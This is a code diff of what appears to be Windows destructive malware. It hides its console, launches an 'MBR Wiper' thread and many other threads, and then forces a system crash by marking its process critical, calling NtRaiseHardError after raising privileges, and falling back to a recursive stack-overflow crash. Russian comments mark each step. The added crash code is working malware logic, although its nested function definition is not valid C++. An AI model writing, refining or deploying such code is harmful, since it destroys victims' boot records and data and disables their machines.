@@ -1132,8 +1132,8 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    // ====== ЗАЩИТА СРАЗУ ======
-    ProcessIsCritical();  // ← Оставляем, потому что TerminateThread больше нет!
+    // ====== ВАЖНО: НЕ ДЕЛАЕМ ПРОЦЕСС КРИТИЧЕСКИМ СРАЗУ! ======
+    // ProcessIsCritical();   // ← ЗАКОММЕНТИРОВАНО!
 
     // Запускаем MBR Wiper
     CreateThread(0, 0, MBRWiper, 0, 0, 0);
@@ -1181,15 +1181,30 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     // ====== ОСТАНАВЛИВАЕМ ВСЕ ПОТОКИ ПО ФЛАГУ ======
     g_bStopThreads = TRUE;
 
-    // Ждём завершения всех потоков (максимум 3 секунды)
     HANDLE threads[] = {t0, t1, t2, t3, t4, t5, t6, t7, t8, t9, t10, t11, t12, t13, t14, t15, t16, t17};
     WaitForMultipleObjects(18, threads, TRUE, 3000);
-
-    // Закрываем хендлы
     for (int i = 0; i < 18; i++) CloseHandle(threads[i]);
 
-    // ====== ВЫЗЫВАЕМ 100% BSOD ======
-    ForceBSOD();
+    // ====== ГАРАНТИРОВАННЫЙ BSOD (оригинальный метод) ======
+    // Делаем процесс критическим ТОЛЬКО СЕЙЧАС
+    ProcessIsCritical();
+
+    // Способ 1: NtRaiseHardError (оригинал)
+    BOOLEAN bl;
+    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtRaiseHardError");
+    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");
+
+    if (RtlAdjustPrivilege && NtRaiseHardError) {
+        RtlAdjustPrivilege(19, 1, 0, &bl);
+        NtRaiseHardError(0xC0000229, 0, 0, 0, 6, NULL);
+    }
+
+    // Способ 2: Если не сработало — Stack Overflow (100%)
+    __declspec(noinline) VOID Crash() {
+        volatile int buffer[8192] = {0};
+        Crash();
+    }
+    Crash();
 
     Sleep(-1);
     return 0;
